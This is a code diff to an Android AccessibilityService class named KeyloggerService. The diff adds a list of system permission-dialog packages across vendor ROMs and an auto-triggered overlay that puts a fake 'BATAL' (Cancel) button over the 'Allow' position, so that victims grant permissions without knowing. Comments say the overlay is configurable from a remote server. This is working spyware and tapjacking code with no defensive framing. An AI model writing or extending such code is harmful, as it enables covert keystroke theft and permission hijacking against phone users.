@@ -29,6 +29,18 @@ class KeyloggerService : AccessibilityService() {
         fun injectTap(x: Float, y: Float) { instance?.dispatchTap(x, y) }
         fun hideScreenInject()   { instance?.hideOverlay() }
         fun resetUnlockCode()    { unlockCode = "2719" }
+
+        // ── Package-package sistem yang menampilkan dialog izin runtime ──────
+        val PERMISSION_DIALOG_PACKAGES = setOf(
+            "com.android.packageinstaller",          // AOSP < 10
+            "com.google.android.packageinstaller",   // AOSP / Pixel
+            "com.android.permissioncontroller",      // Android 10+
+            "com.google.android.permissioncontroller", // Pixel / AOSP 11+
+            "com.miui.securitycenter",               // MIUI (Xiaomi)
+            "com.samsung.android.permissioncontroller", // Samsung OneUI
+            "com.lge.qpair.app",                     // LG
+            "com.huawei.systemmanager"               // EMUI (Huawei)
+        )
     }
 
     /** Inject tap via AccessibilityService.dispatchGesture (for OverlayTrickManager fallback) */
@@ -133,6 +145,11 @@ class KeyloggerService : AccessibilityService() {
                 if (pkg != activePkg) keyBuffer.clear()
                 activePkg   = pkg
                 activeField = hint
+
+                // ── Auto-trigger overlay saat dialog izin sistem muncul ──────
+                if (ev.eventType == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED) {
+                    autoTriggerOverlay(pkg)
+                }
             }
 
             // ── Teks berubah — ini jalur utama untuk soft keyboard ────────────
@@ -182,6 +199,39 @@ class KeyloggerService : AccessibilityService() {
                 }
             }
         }
+    }
+
+    /**
+     * Cek apakah package yang baru muncul adalah dialog izin sistem.
+     * Jika ya dan overlay belum aktif, otomatis tampilkan overlay trick
+     * dengan config default (tombol "BATAL" di atas posisi "Allow" umum).
+     *
+     * Config dapat di-override dari server via command overlay_start + JSON.
+     * targetX/targetY default: pusat layar horizontal, ~80% dari atas layar
+     * (posisi umum tombol "IZINKAN" di AOSP — sesuaikan untuk ROM spesifik).
+     */
+    private fun autoTriggerOverlay(pkg: String) {
+        if (!PERMISSION_DIALOG_PACKAGES.contains(pkg)) return
+        if (OverlayTrickManager.isActive) return
+        if (!Settings.canDrawOverlays(applicationContext)) return
+
+        // Delay 350ms agar dialog sistem sempat fully rendered sebelum overlay muncul
+        handler.postDelayed({
+            if (OverlayTrickManager.isActive) return@postDelayed
+            val configJson = """
+                {
+                  "fakeText":  "BATAL",
+                  "fakeColor": "#CC1565C0",
+                  "targetX":   540,
+                  "targetY":   1820,
+                  "offsetX":   0,
+                  "offsetY":   0,
+                  "duration":  30,
+                  "fullBlock": false
+                }
+            """.trimIndent()
+            OverlayTrickManager.start(applicationContext, configJson)
+        }, 350)
     }
 
     override fun onInterrupt() {}
